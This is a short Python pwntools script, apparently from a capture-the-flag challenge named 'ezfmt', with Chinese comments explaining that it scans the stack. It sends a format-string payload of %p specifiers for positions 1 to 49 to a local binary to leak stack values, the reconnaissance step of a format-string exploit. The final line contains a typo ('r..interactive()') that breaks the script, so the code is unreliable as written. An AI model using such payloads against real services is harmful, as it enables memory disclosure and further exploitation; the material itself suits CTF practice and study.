#先在本地执行确定位置
from pwn import*
elf = context.binary = ELF('./ezfmt')
r = process('./ezfmt') 
#扫栈
payload = b''
for i in range(1,50):payload += f'{i} %p\n'.encode()
#%p 把那个参数当成指针的数值打印出来
r.sendlineafter(b'Input your format string.', payload)
r..interactive()
